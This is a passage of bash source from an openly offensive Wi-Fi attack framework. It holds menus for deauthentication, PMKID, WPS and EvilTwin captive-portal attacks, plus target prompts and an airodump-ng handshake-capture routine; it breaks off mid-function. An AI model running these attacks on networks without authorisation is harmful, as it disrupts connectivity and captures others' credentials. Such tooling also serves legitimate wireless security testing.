#!/bin/bash

#--------------------------------
#
# WEF - WiFi Exploitation Framework
# By D3Ext and megazar
# Twitter: @d3ext and @megazar21
# Website: https://d3ext.github.io/
# Mail: <d3ext@proton.me>
# Github(s): https://github.com/D3Ext and https://github.com/ultrazar
#
#--------------------------------



#
# Functions used to catch Ctrl+C sigterm, to remove temporal files and to revert interface changes
#

# Ctrl + C
function ctrl_c(){
  if [ "$(check_interface_mode)" == "monitor" ]; then
    killall aireplay-ng airodump-ng mdk4 2>/dev/null

    while true; do
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to disable monitor mode? (default=yes) [${yC}y${blueC}/${yC}n${blueC}]: " && read disable_opt
      else
        color_output_no_line "*" "¿Quieres desactivar el modo monitor? (por defecto=si) [${yC}s${blueC}/${yC}n${blueC}]: " && read disable_opt
      fi

      if [ "$disable_opt" == "y" ] || [ "$disable_opt" == "yes" ] || [ "$disable_opt" == "s" ] || [ "$disable_opt" == "si" ]; then
        disable_mon
        break
      elif [ ! "$disable_opt" ]; then
        disable_mon
        break
      elif [ "$disable_opt" != "n" ] || [ "$disable_opt" != "no" ]; then
        color_output "X" "Invalid option"
      fi
    done
  fi

  # Avoid errors by killing possible processes which haven't been killed (shouldn't occur, just to prevent)
  kill -9 ${air_PID} 2>/dev/null; wait ${air_PID} 2>/dev/null
  kill -9 ${air2_PID} 2>/dev/null; wait ${air2_PID} 2>/dev/null
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
  kill -9 ${hcx_PID} 2>/dev/null; wait ${hcx_PID} 2>/dev/null
  kill -9 ${reaver_PID} 2>/dev/null; wait ${reaver_PID} 2>/dev/null
  kill -9 ${replay_PID} 2>/dev/null; wait ${replay_PID} 2>/dev/null
  kill -9 ${passive_PID} 2>/dev/null; wait ${passive_PID} 2>/dev/null

  wpa_process=$(pidof wpa_supplicant)
  net_process=$(pidof NetworkManager)
  if [ ! "$wpa_process" ]; then
    if [ "$lang" == "en" ]; then
      color_output "*" "Restarting connections"
    else
      color_output "*" "Restableciendo conexiones"
    fi

    systemctl restart wpa_supplicant 2>/dev/null
    if [ ! "$net_process" ]; then
      systemctl restart NetworkManager 2>/dev/null
    fi
  fi

  if [ "$lang" == "en" ]; then
    color_output "!" "Exiting..."
  else
    color_output "!" "Saliendo..."
  fi

  # Remove files created during the attacks
  rm /tmp/.scan_output 2>/dev/null
  exit 0
}

# Ctrl + C for EvilTwin attack
function evil_c(){
  echo
  # Kill created processes
  if [ "$lang" == "en" ]; then
    color_output_ln "!" "Stoping processes..."
  else
    color_output_ln "!" "Parando procesos..."
  fi
  killall hostapd hostapd-wpe dnsmasq dhcp aireplay-ng xterm lighttpd &>/dev/null
  systemctl restart systemd-resolved &>/dev/null

  # Reconfigure the network adapter
  if [ "$lang" == "en" ]; then
    color_output "*" "Reconfiguring interface"
  else
    color_output "*" "Reconfigurando la interfaz"
  fi

  restore_interface_eviltwin
}

# Ctrl + C for cracking processes
function crack_c(){
  echo
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Interrupt received, do you want to exit? [${yC}y${blueC}/${yC}n${blueC}]: " && read crack_opt
  else
    color_output_no_line "*" "Interrupción detectada, quieres salir? [${yC}s${blueC}/${yC}n${blueC}]: " && read crack_opt
  fi

  if [ "$crack_opt" == "y" ] || [ "$crack_opt" == "yes" ] || [ "$crack_opt" == "s" ] || [ "$crack_opt" == "si" ]; then
    killall hashcat john aircrack-ng 2>/dev/null
    keep_exit
  fi
}

# Ctrl + C for inhibition function
function inhibition_c(){
  # Kill deauth process
  killall aireplay-ng 2>/dev/null
}

function keep_exit(){
  if [ "$lang" == "en" ]; then
    echo -ne "${blueC}[${yC}*${blueC}] Do you want to exit from tool (${yC}y${blueC}) or going back to main menu (${yC}n${blueC})? : ${endC}" && read exit_status
  else
    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres salir de la herramienta (${yC}s${blueC}) o volver al menu (${yC}n${blueC})? : ${endC}" && read exit_status
  fi

  # If input is y or yes exit from the function
  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
    ctrl_c
  elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ]; then
    if [ "$lang" == "en" ]; then
      color_output "X" "Unknown option"
    else
      color_output "X" "Opción inválida"
    fi

    keep_exit
  fi
}

function keep_exit_c(){
  # Workaround to stop mdk4 attacks
  kill -9 ${mdk4_PID} 2>/dev/null; wait ${mdk4_PID} 2>/dev/null
  killall hashcat john aircrack-ng 2>/dev/null

  if [ "$lang" == "en" ]; then
    echo -ne "\n${blueC}[${yC}*${blueC}] Interrupt received, do you want to exit from tool? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
  else
    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
  fi

  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
    ctrl_c
  elif [ "$exit_status" == "n" ] || [ "$exit_status" == "no" ]; then
    if [[ $input == 1 ]]; then
      echo -ne "${blueC}[${yC}WEF${blueC}] >>${endC} "
    fi
  else
    if [ "$lang" == "en" ]; then
      color_output "X" "Unknown option"
    else
      color_output "X" "Opción inválida"
    fi

    keep_exit_c
  fi
}

function keep_exit_eviltwin(){
  if [ "$lang" == "en" ]; then
    echo -ne "\n${blueC}[${yC}*${blueC}] Interrupt received, do you want to exit from tool? [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
  else
    echo -ne "\n${blueC}[${yC}*${blueC}] Ctrl+C detectado, ¿quieres salir de la herramienta? [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read exit_status
  fi

  if [ "$exit_status" == "y" ] || [ "$exit_status" == "yes" ] || [ "$exit_status" == "s" ] || [ "$exit_status" == "si" ]; then
    evil_c
    exit 0
  elif [ "$exit_status" != "n" ] && [ "$exit_status" != "no" ]; then
    if [ "$lang" == "en" ]; then
      color_output "X" "Unknown option"
    else
      color_output "X" "Opción inválida"
    fi

    keep_exit_eviltwin
  fi
}



#
# Logging functions to not to repeat code a lot of times
#

function banner(){
  echo -e "${yC}██╗    ██╗███████╗███████╗"
  echo -e "██║    ██║██╔════╝██╔════╝               "
  echo -e "██║ █╗ ██║█████╗  █████╗                 "
  echo -e "██║███╗██║██╔══╝  ██╔══╝       ${blueC}[${yC}WEF${blueC}] WiFi Exploitation Framework ${yC}${program_version}"
  echo -e "╚███╔███╔╝███████╗██║                    "
  echo -e " ╚══╝╚══╝ ╚══════╝╚═╝${endC}"
}

function color_output_ln(){
  echo -e "\n${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function color_output(){
  echo -e "${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function color_output_no_line(){
  echo -ne "${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function color_output_tab(){
  echo -e "\t${blueC}[${yC}${1}${blueC}] ${2}${endC}"
}

function good_output_ln(){
  echo -e "\n${blueC}[${greenC}${1}${blueC}] ${2}${endC}"
}

function good_output(){
  echo -e "${blueC}[${greenC}${1}${blueC}] ${2}${endC}"
}

function press_enter_attack(){
  if [ "$lang" == "en" ]; then
    echo -ne "\n${grayC}Press Enter to continue and launch attack${endC} " && read continue
  else
    echo -ne "\n${grayC}Presiona Enter para continuar y lanzar el ataque${endC} " && read continue
  fi
}

function press_enter(){
  echo -ne "\n${grayC}${1}${endC}" && read continue
}

# Create a simple progress bar with dots
function progress_bar(){
  echo -ne "${blueC}[${yC}${3}${blueC}] ${4}"
  for ((i = 0; i <= ${1}; i++)); do
    echo -ne "."
    sleep ${2}
  done

  echo -e "${endC}"
}

# This function is used when user selects an attack and monitor mode isn't enabled
function log_monitor_is_disabled(){
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Your network card interface is not in monitor mode."
    echo -e "${blueC}[${yC}*${blueC}] Please before doing any attack type ${yC}enable${blueC} and press Enter, it will enable monitor mode${endC}"
  else
    color_output_ln "*" "La interfaz de la tarjeta de red no está en modo monitor."
    echo -e "${blueC}[${yC}*${blueC}] Antes de hacer cualquier ataque escribe ${yC}enable${blueC} y presiona Enter para activar el modo monitor${endC}"
  fi
  clear_p=0
}

# Tell the user that the attack has been completed and a log was stored under logs folder
function log_completed(){
  if [ "$lang" == "en" ]; then
    good_output_ln "+" "Attack completed"; sleep 0.1
    color_output "*" "Log with some attack info was stored in /opt/wef/main/logs/${name}.log"
  else
    good_output_ln "+" "Ataque completado"; sleep 0.1
    color_output "*" "Log con información sobre el ataque ha sido creado en /opt/wef/main/logs/${name}.log"
  fi
}

# Tell the user that he/she can type "back" and he/she will return to main menu
function log_back_to_menu(){
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Type '${yC}back${blueC}' to return to the main menu"
  else
    color_output_ln "*" "Escribe '${yC}back${blueC}' para volver al menú principal"
  fi
}

function log_attack_info(){
  if [ "$lang" == "en" ]; then
    good_output "+" "Attack information"
  else
    good_output "+" "Información del ataque"
  fi

  if [ "$name" ]; then
    echo -e "${blueC} ESSID:${grayC} ${name}${endC}"
  fi

  if [ "$ap_mac" ]; then
    echo -e "${blueC} BSSID:${grayC} ${ap_mac}${endC}"
  fi

  if [ "$channel" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Channel:${grayC} ${channel}${endC}"
    else
      echo -e "${blueC} Canal:${grayC} ${channel}${endC}"
    fi
  fi

  if [ "$attack_time" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Duration:${grayC} ${attack_time}${endC}"
    else
      echo -e "${blueC} Duración:${grayC} ${attack_time}${endC}"
    fi
  fi

  if [ "$packets_to_send" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Packets:${grayC} ${packets_to_send}${endC}"
    else
      echo -e "${blueC} Paquetes:${grayC} ${packets_to_send}${endC}"
    fi
  fi

  if [ "$c_h" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC} Capture handshakes?:${grayC} ${c_h}${endC}"
    else
      echo -e "${blueC} Capturar handshakes?:${grayC} ${c_h}${endC}"
    fi
  fi
}

function log_functions_info(){
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "You can find explanations of every attack in the official Wiki here: https://github.com/D3Ext/WEF/wiki/Attacks"
  else
    color_output_ln "*" "Puedes encontrar la explicación de cada ataque en la Wiki oficial aqui: https://github.com/D3Ext/WEF/wiki/Attacks"
  fi
}




#
# Help panels functions
#

function help_panel(){
  echo -e "${yC} __      _____ ___ "
  echo -e " \ \    / / __| __|"
  echo -e "  \ \/\/ /| _|| _| "
  echo -e "   \_/\_/ |___|_|  "
  echo -e "\n${blueC}[${yC}WEF${blueC}] Wi-Fi Exploitation Framework ${yC}${program_version}${endC}"

  list_interfaces # Show active interfaces (excluding the ethernet and loopback ones)
  if [ "$lang" == "en" ]; then
    echo -e "\n${blueC}Required parameters:"
    echo -e "\t${yC}-i, --interface)${blueC} \tThe name of your network card interface in managed mode"
    echo -e "\nOptional parameters:"
    echo -e "\t${yC}-v, --verbose)${blueC} \t\tShow more info during the attacks (recommended)"
    echo -e "\t${yC}-h, --help)${blueC} \t\tShow this help panel"
    echo -e "\t${yC}--version)${blueC} \t\tPrint the version and exit${endC}"
    echo -e "\t${yC}-s)${blueC} \t\t\tSet tool language to spanish${endC}\n"
  else
    echo -e "\n${blueC}Parametros requeridos:"
    echo -e "\t${yC}-i, --interface)${blueC} \tEl nombre de la interfaz de tu tarjeta de red en modo managed"
    echo -e "\nParametros opcionales:"
    echo -e "\t${yC}-v, --verbose)${blueC} \t\tMuestra mas información durante los ataques (recomendado)"
    echo -e "\t${yC}-h, --help)${blueC} \t\tMuestra este panel de ayuda"
    echo -e "\t${yC}--version)${blueC} \t\tImprime por pantalla la versión actual del programa${endC}"
    echo -e "\t${yC}-s)${blueC} \t\t\tCambia idioma al español\n"
  fi
  exit 0
}

# Attacks panel
function show_panel(){
  if [ "$lang" == "en" ]; then
    echo -e "\n${blueC}------DoS attacks--------       ------WEP attacks---------      -----Rogue AP attacks----${endC}"
    echo -e "${blueC}[${yC}1${blueC}] Deauthentication attack\t[${yC}8${blueC}]  Replay attack\t\t[${yC}13${blueC}] EvilTwin attack${endC}"
    echo -e "${blueC}[${yC}2${blueC}] WIDS Confusion attack\t[${yC}9${blueC}]  ChopChop attack${endC}"
    echo -e "${blueC}[${yC}3${blueC}] Auth DoS attack\t\t[${yC}10${blueC}] CaffeLatte attack${endC}"
    echo -e "${blueC}[${yC}4${blueC}] Beacon Flood attack${endC}"
    echo -e "${blueC}[${yC}5${blueC}] Michael Exploitation attack${endC}"
    echo -e "\n${blueC}------WPS attacks--------       ------Handshake attacks---${endC}"
    echo -e "${blueC}[${yC}6${blueC}] Pixie Dust attack\t\t[${yC}11${blueC}] WPA capture attack${endC}"
    echo -e "${blueC}[${yC}7${blueC}] Null Pin attack\t\t[${yC}12${blueC}] PMKID attack${endC}"
  else
    echo -e "\n${blueC}------Ataques DoS--------       ------Ataques WEP---------      -----Ataques Rogue AP----${endC}${endC}"
    echo -e "${blueC}[${yC}1${blueC}] Ataque de Deauthentication\t[${yC}8${blueC}]  Ataque de Replay\t\t[${yC}13${blueC}] Ataque EvilTwin${endC}"
    echo -e "${blueC}[${yC}2${blueC}] Ataque de confusión WIDS\t[${yC}9${blueC}]  Ataque ChopChop${endC}"
    echo -e "${blueC}[${yC}3${blueC}] Ataque Auth DoS\t\t[${yC}10${blueC}] Ataque CaffeLatte${endC}"
    echo -e "${blueC}[${yC}4${blueC}] Ataque de Beacon Flood${endC}"
    echo -e "${blueC}[${yC}5${blueC}] Ataque Michael Exploitation${endC}"
    echo -e "\n${blueC}------Ataques WPS--------       ------Ataques Handshake---${endC}"
    echo -e "${blueC}[${yC}6${blueC}] Ataque Pixie Dust\t\t[${yC}11${blueC}] Captura handshake WPA${endC}"
    echo -e "${blueC}[${yC}7${blueC}] Ataque de Pin nulo\t\t[${yC}12${blueC}] Ataque PMKID${endC}"
  fi
}

# Commands help panel
function list_help(){
  if [ "$lang" == "en" ]; then
    echo -e "\n\t${yC}Command\t\t\tDescription"
    echo -e "\t-------\t\t\t-----------${endC}"
    echo -e "${blueC} \tenable\t\t\t- Enable monitor mode for especified network interface${endC}"
    echo -e "${blueC} \tdisable\t\t\t- Disable monitor mode and enable managed mode for especified network interface${endC}"
    echo -e "${blueC} \tmac\t\t\t- Change interface MAC with a custom or random address${endC}"
    echo -e "${blueC} \tcheck <file.cap>\t- Check if given capture file contains at least one WPA handshake${endC}"
    echo -e "${blueC} \tscan\t\t\t- Scan access points during 25s (also updates AP list)${endC}"
    echo -e "${blueC} \tlist\t\t\t- List already scanned APs${endC}"
    echo -e "${blueC} \texit/quit\t\t- Exit from the framework${endC}"
    echo -e "${blueC} \tchipsets\t\t- List the chipsets which supports monitor mode${endC}"
    echo -e "${blueC} \thelp/?\t\t\t- Print this help panel${endC}"
    echo -e "${blueC} \tinhibit <ap_name>\t- Inhibit an AP connections until you press Ctrl + C (deauth all clients)${endC}"
    echo -e "${blueC} \tinfo\t\t\t- Show info about the network card interface${endC}"
    echo -e "${blueC} \tverbose\t\t\t- Set verbose on, to see more output${endC}"
    echo -e "${blueC} \tno verbose\t\t- Set verbose off, to see less output${endC}"
    echo -e "${blueC} \tattacks\t\t\t- Show info about the different attacks${endC}"
    echo -e "${blueC} \tupdate\t\t\t- Check if an update is available and ask you to install it${endC}"
    echo -e "${blueC} \tversion\t\t\t- Print the info about the version of wef${endC}"
    echo -e "${blueC} \tpanel\t\t\t- Display attack options panel${endC}"
    echo -e "${blueC} \tclear/cls\t\t- Clear the screen${endC}"
  else
    echo -e "\n\t${yC}Comando\t\t\tDescripción"
    echo -e "\t-------\t\t\t-----------${endC}"
    echo -e "${blueC} \tenable\t\t\t- Habilita el modo monitor en la interfaz de red especificada${endC}"
    echo -e "${blueC} \tdisable\t\t\t- Desactiva el modo monitor y habilita el modo managed en la interfaz de red especificada${endC}"
    echo -e "${blueC} \tmac\t\t\t- Cambia la MAC de la interfaz por una dirección concreta o una aleatoria${endC}"
    echo -e "${blueC} \tcheck <file.cap>\t- Comprueba si el archivo especificado contiene al menos un handshake WPA${endC}"
    echo -e "${blueC} \tscan\t\t\t- Escanea los puntos de acceso cercanos durante 25s (recarga la lista si ya se han escaneado)${endC}"
    echo -e "${blueC} \tlist\t\t\t- Muestra la lista los APs escaneados${endC}"
    echo -e "${blueC} \texit/quit\t\t- Salir del framework${endC}"
    echo -e "${blueC} \tchipsets\t\t- Lista los chipsets que soportan modo monitor${endC}"
    echo -e "${blueC} \thelp/?\t\t\t- Imprime este panel de comandos${endC}"
    echo -e "${blueC} \tinhibit <ap_name>\t- Inhibe las conexiones de un AP hasta que presiones Ctrl + C (deautentica a todos los clientes)${endC}"
    echo -e "${blueC} \tinfo\t\t\t- Muestra información sobre la interfaz de la tarjeta de red${endC}"
    echo -e "${blueC} \tverbose\t\t\t- Activa el verbose, para ver mas info durante los ataques${endC}"
    echo -e "${blueC} \tno verbose\t\t- Desactiva el verbose, para ver menos info durante los ataque${endC}"
    echo -e "${blueC} \tattacks\t\t\t- Muestra info sobre los diferentes ataques${endC}"
    echo -e "${blueC} \tupdate\t\t\t- Comprueba si hay alguna actualización disponible y la instala${endC}"
    echo -e "${blueC} \tversion\t\t\t- Imprime la version actual de la herramienta${endC}"
    echo -e "${blueC} \tpanel\t\t\t- Muestra el panel con las opciones de los ataques${endC}"
    echo -e "${blueC} \tclear/cls\t\t- Limpia la pantalla${endC}"
  fi
}

function evil_twin_panel() {
  color_output "1" "Rogue AP - Captive Portal"
  color_output "2" "Rogue AP - Captive Portal - DoS (recommended)"
  #color_output "3" "Rogue AP - Captive Portal - WiFi Enterprise"
  #color_output "4" "Rogue AP - Captive Portal - WiFi Enterprise - DoS"
}

# Chipsets for monitor mode
function chipsets_panel(){
  echo -e "\n\t${yC}Chipsets"
  echo -e "\t--------${blueC}"
  echo -e " \tRTL8812AU"
  echo -e " \tAR9271"
  echo -e " \tMT7610U"
  echo -e " \tMT7612U"
  echo -e " \tRTL8814U"
  echo -e " \tRTL8188EUS${endC}"
}




#
# Auxiliar functions to ask data to user (ESSID, BSSID, attack time, frames to send...)
#

# Ask for target ESSID
function ask_essid(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Enter target AP name: " && read name
  else
    color_output_no_line "*" "Introduce el nombre del AP objetivo: " && read name
  fi

  if [ "${name}" == "exit" ] || [ "${name}" == "quit" ]; then
    ctrl_c
  fi
}

# Ask for target BSSID
function ask_mac(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Enter MAC address of the AP (BSSID): " && read ap_mac
  else
    color_output_no_line "*" "Introduce la dirección MAC del AP (BSSID): " && read ap_mac
  fi

  if [ "${ap_mac}" == "exit" ] || [ "${ap_mac}" == "quit" ]; then
    ctrl_c
  fi
}

# Ask for client MAC
function ask_mac2(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Client MAC address: " && read client_mac
  else
    color_output_no_line "*" "Dirección MAC del cliente: " && read client_mac
  fi

  if [ "${client_mac}" == "exit" ] || [ "${client_mac}" == "quit" ]; then
    ctrl_c
  fi
}

# Ask for attack duration
function ask_time(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Set attack duration (default=${default}): " && read attack_time
  else
    color_output_no_line "*" "Introduce la duración del ataque (por defecto=${default}): " && read attack_time
  fi

  if [ "${attack_time}" == "exit" ] || [ "${attack_time}" == "quit" ]; then
    ctrl_c
  fi

  if [ ! "${attack_time}" ]; then
    attack_time="${default}"
  fi

  if [[ ${attack_time} =~ [^0-9ms] ]] && [ "${attack_time}" != "back" ]; then
    if [ "$lang" == "en" ]; then
      color_output "X" "Invalid attack duration!"
    else
      color_output "X" "Duración inválida!"
    fi

    ask_time
  fi

}

# Ask amount of frames to send
function ask_packets(){
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Amount of deauth frames to send (default=${default}): " && read packets_to_send
  else
    color_output_no_line "*" "Cantidad de paquetes de deautenticación a enviar (por defecto=${default}): " && read packets_to_send
  fi

  if [ ! "$packets_to_send" ]; then
    packets_to_send="${default}"
  fi

  if [ "$packets_to_send" == "exit" ] || [ "$packets_to_send" == "quit" ]; then
    ctrl_c
  fi
}

# Ask the user if he/she wants to capture handshakes
function ask_handshakes(){
  if [ "$lang" == "en" ]; then
    echo -ne "${blueC}[${yC}*${blueC}] Do you want to capture handshakes? (default=yes) [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read c_hand
  else
    echo -ne "${blueC}[${yC}*${blueC}] ¿Quieres capturar los handshakes? (por defecto=si) [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read c_hand
  fi

  if [ "$c_hand" == "exit" ] || [ "$c_hand" == "quit" ]; then
    ctrl_c
  fi

  # Check user input to start airodump or not
  if [ "$c_hand" == "y" ] || [ "$c_hand" == "yes" ] || [ "$c_hand" == "s" ] || [ "$c_hand" == "si" ] || [ ! "$c_hand" ]; then
    if [ "$lang" == "en" ]; then
      echo -e "${blueC}Don't close airodump-ng window, it will be closed automatically${endC}"
    else
      echo -e "${blueC}No cierres la ventana de airodump-ng, se cerrará automaticamente${endC}"
    fi; sleep 0.2
    c_h="true"
    cap_date=$(date +"%Y-%m-%d-%H-%M-%S")
    cap_name="${cap_date}-capture"

    xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Airodump-ng" -e "airodump-ng -c ${channel} -w \"/opt/wef/main/captures/${name}/${cap_name}\" --essid \"${name}\" ${netCard}" 2>/dev/null &
    air_PID=$!
  else
    c_h="false"
  fi
}

# Ask user for new interface name if it has changed when enabling monitor mode
function ask_new_name(){
  if [ "$lang" == "en" ]; then
    echo -e "${blueC}\nIn new interfaces nomenclature, names change after enabling monitor mode${endC}"
    echo -ne "${blueC}[${yC}*${blueC}] Interface name has changed, how is it called now? (execute iwconfig to see its name): ${endC}" && read new_name
  else
    echo -e "${blueC}\nCon la nueva nomenclatura de las interfaces, los nombre cambian despues de activar el modo monitor${endC}"
    echo -ne "${blueC}[${yC}*${blueC}] El nombre de la interfaz ha cambiado, ¿como se llama ahora? (ejecuta iwconfig para verlo): ${endC}" && read new_name
  fi

  if [ ! -d "/sys/class/net/${new_name}" ]; then
    if [ "$lang" == "en" ]; then
      color_output_ln "X" "Especified interface doesn't exist!"
    else
      color_output_ln "X" "La interfaz especificada no existe!"
    fi
    ask_new_name
  fi

  evilCard=${netCard}
  netCard=${new_name}
  ifconfig "${netCard}" up 2>/dev/null; sleep 0.2
  start_counter=1
}

# Ask for AP BSSID if name is duplicated
function ask_name_duplicate(){
  cat /tmp/.scan_output | grep "${name}$"
  if [ "$lang" == "en" ]; then
    color_output_no_line "*" "Multiple APs found with that name, enter its BSSID: " && read ap_bssid
  else
    color_output_no_line "*" "Múltiples APs encontrados con ese nombre, introduce su BSSID: " && read ap_bssid
  fi

  if [ "$ap_bssid" == "exit" ] || [ "$ap_bssid" == "quit" ]; then
    ctrl_c
  fi
}

function ask_to_crack_handshakes(){
  if [ "${c_h}" == "true" ]; then
    if [ "$(check_handshake)" -gt "0" ]; then
      if [ "$lang" == "en" ]; then
        echo -ne "\n${blueC}[${yC}*${blueC}] Do you want to crack the handshakes? This process will take a long time [${yC}y${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
      else
        echo -ne "\n${blueC}[${yC}*${blueC}] Quieres crackear los handshakes? Este proceso tardará bastante tiempo [${yC}s${blueC}/${yC}n${blueC}]: ${endC}" && read crack_option
      fi
    fi
  fi
}




#
# Extra auxiliary functions
#

function report-gen(){
  if [ ! -f "/opt/wef/main/logs/${name}.log" ]; then
    touch "/opt/wef/main/logs/${name}.log" 2>/dev/null
  fi

  # No name
  if [ ! "${name}" ]; then
    if [ "$lang" == "en" ]; then
      name="Not especified"
    else
      name="No especificado"
    fi
  fi

  # No channel
  if [ ! "${channel}" ]; then
    if [ "$lang" == "en" ]; then
      channel="Not especified"
    else
      channel="No especificado"
    fi
  fi

  # Duration not especified
  if [ ! "${attack_time}" ]; then
    if [ "$lang" == "en" ]; then
      attack_time="Not especified"
    else
      attack_time="No especificado"
    fi
  fi

  # Log file format
  if [ "$lang" == "en" ]; then
    echo -e "[WEF] WiFi Exploitation Framework
---------------------------------
Attack date: ${actual_date}
Attack type: ${type_of_attack}
Target Access Point: ${name}
Attack duration: ${attack_time}
AP channel: ${channel}
---------------------------------\n" >> "/opt/wef/main/logs/${name}.log" 2>/dev/null
  else
    echo -e "[WEF] WiFi Exploitation Framework
---------------------------------
Fecha del ataque: ${actual_date}
Tipo de ataque: ${type_of_attack}
Punto de acceso objetivo: ${name}
Duración del ataque: ${attack_time}
Canal del AP: ${channel}
---------------------------------\n" >> "/opt/wef/main/logs/${name}.log" 2>/dev/null
  fi
}

function parse_info(){
  if [[ $(check_dups | wc -l) > 1 ]]; then
    ask_name_duplicate
    if [ "$ap_bssid" == "back" ]; then
      return
    fi

    channel=$(cat /tmp/.scan_output | grep "${name}$" | grep "${ap_bssid}" | awk '{print $2}' | head -n 1)
    ap_mac="${ap_bssid}"
    actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")

  else
    channel=$(cat /tmp/.scan_output | grep "${name}$" | awk '{print $2}' | head -n 1)
    ap_mac=$(cat /tmp/.scan_output | grep "${name}$" | awk '{print $1}' | head -n 1)
    actual_date=$(date | awk '{print $1 " " $2 " " $3 " " $4 " " $5}' FS=" ")
  fi
}

function print_chipset(){
  delim=$(airmon-ng | grep "${netCard}" | awk '{print $3}')
  good_output "+" "Chipset:${grayC}\t\t\t$(airmon-ng | grep "${netCard}" | grep -oP "(?<=${delim}).*(?=802)" | sed 's/^[[:blank:]]*//')"
}

function check_vif(){
  iw list | grep "Supported interface modes" -A 8 | grep "AP/VLAN"
}

# Check the interface mode
function check_interface_mode(){
  # Function implemented by ultrazar
  # Workaround for arch linux
  if [ "$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"' | grep "Arch")" == "Arch" ]; then
    iwconfig ${netCard} 2>/dev/null | grep 'Mode' | awk '{print $4}' | awk '{print $2}' FS=":" | sed -e 's/\(.*\)/\L\1/' 2>/dev/null
  else
    iw dev ${netCard} info 2>/dev/null | grep 'type' | awk '{print $2}'
  fi
}

function check_monitor_type(){
  # Check if monitor mode was enabled using airmon-ng or iwconfig
  if [ "$(echo "${netCard}" | grep "mon")" ]; then
    echo "airmon"
  else
    echo "iwconfig"
  fi
}

function check_dups(){
  cat /tmp/.scan_output | grep "${name}$"
}

function check_handshake(){
  total_amount=$(aircrack-ng "/opt/wef/main/captures/${name}/${cap_name}-01.cap" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)')
  if [ "$total_amount" == "" ]; then
    echo "0"
  else
    echo "${total_amount}" | tr -d " "
  fi
}

function check_handshakes_in_file(){
  total_amount=$(aircrack-ng "${cap_name}" 2>/dev/null | grep "WPA" | grep -oP '(?<=WPA \().*(?=handshake)')
  if [ "$total_amount" == "" ]; then
    echo "0"
  else
    echo "${total_amount}" | tr -d " "
  fi
}

function check_and_create(){
  if [ ! -d "${1}" ]; then
    mkdir "${1}" 2>/dev/null
  fi
}

# https://stackoverflow.com/questions/42660218/bash-generate-random-mac-address-unicast
function generate_rand_mac(){
  hexdump -n 6 -ve '1/1 "%.2x "' /dev/random | awk -v a="2,6,a,e" -v r="$RANDOM" 'BEGIN{srand(r);}NR==1{split(a,b,",");r=int(rand()*4+1);printf "%s%s:%s:%s:%s:%s:%s\n",substr($1,0,1),b[r],$2,$3,$4,$5,$6}'
}

# Sets some important variables to "" (empty) to avoid errors and more
function reset_info(){
  channel=""
  name=""
  attack_time=""
  packets_to_send=""
  ap_mac=""
  catch_handshakes=""
  c_h=""
  crack_option=""
}



#
# Extra functions
#

function list_interfaces(){
  interfaces_out=$(ifconfig | grep ": flags=" | awk '{print $1}' FS=":" | grep -v "lo")

  color_output_ln "*" "Interfaces:"
  while IFS= read -r line; do
    echo -e "\t${grayC}${line}${endC}"
  done <<< "${interfaces_out}"
}

# Dependencies Function
function dependencies(){
  # Programs array
  programs=(macchanger aircrack-ng reaver mdk4 hashcat hcxdumptool xterm wget dnsmasq hostapd hostapd-wpe lighttpd pixiewps)
  system=$(cat /etc/os-release | grep '^NAME=' | awk '{print $1}' FS=' ' | awk '{print $2}' FS='"')
  if [ "${system}"  == "Parrot" ] || [ "${system}"  == "Kali" ] || [ "${system}"  == "Ubuntu" ]; then
    for program in "${programs[@]}"; do
      which $program &>/dev/null
      if [ "$(echo $?)" == "1" ]; then
        if [ "$lang" == "en" ]; then
          color_output "*" "Installing ${program}..."
        else
          color_output "*" "Instalando ${program}"
        fi
        apt install "${program}" -y
      fi
    done

  elif [ "${system}"  == "Arch" ] || [ "$(echo \"${system}\" | grep -i \"arch\")" ]; then
    for program in "${programs[@]}"; do
      which $program &>/dev/null
      if [ "$(echo $?)" == "1" ]; then
        if [ "$lang" == "en" ]; then
          color_output "*" "Installing ${program}..."
        else
          color_output "*" "Instalando ${program}..."
        fi
        pacman -S "${program}" --noconfirm
      fi
    done
  fi
}

#
# Functions related to network interface info (MAC, mode, frequencies...) and enabling/disabling monitor mode
#

# Check if interface is in managed or monitor mode
function print_interface_mode(){
  status_card=$(check_interface_mode)
  # Check if the network adapter is in monitor mode or not
  if [ "${status_card}" == "monitor" ]; then
    if [ "$lang" == "en" ]; then
